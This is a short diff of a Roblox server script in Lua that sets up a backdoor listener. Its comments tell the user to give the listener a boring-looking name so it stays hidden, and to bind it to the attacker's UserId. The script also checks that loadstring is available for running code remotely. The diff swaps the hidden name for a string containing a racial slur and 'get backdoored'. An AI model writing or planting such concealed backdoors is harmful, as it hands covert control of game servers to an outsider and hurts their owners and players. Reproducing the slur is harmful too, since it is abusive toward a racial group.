@@ -2,8 +2,8 @@
 -- This script sets up the listener on the server.
 
 local REPLICATED_STORAGE = game:GetService("ReplicatedStorage")
-local HIDDEN_NAME = "InternalSettings" -- Rename this to something boring
-local YOUR_USER_ID = 12345678 -- REPLACE THIS with your actual UserId
+local HIDDEN_NAME = "get backdoored nigga" -- Rename this to something boring
+local YOUR_USER_ID = 10528532105 -- REPLACE THIS with your actual UserId
 
 -- Check if loadstring is actually enabled
 local loadstringEnabled = pcall(function() loadstring("") end)
